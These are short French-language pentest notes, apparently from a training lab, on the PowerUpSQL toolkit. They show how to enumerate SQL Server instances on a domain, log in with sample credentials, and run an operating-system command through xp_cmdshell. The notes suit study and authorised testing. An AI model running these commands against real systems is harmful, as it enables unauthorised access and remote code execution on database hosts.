

https://github.com/NetSPI/PowerUpSQL

https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet


Importer le module

```powershell
Import-Module .\PowerUpSQL.ps1
```

Afficher les machines ayant le service SQL sur le domaine

```powershell
Get-SQLInstanceDomain
```

S'authentifier à la DB et afficher la version

```powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

Commande avec xp_cmshell

```powershell
Invoke-SQLOSCmd -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -command 'whoami' -Verbose
```

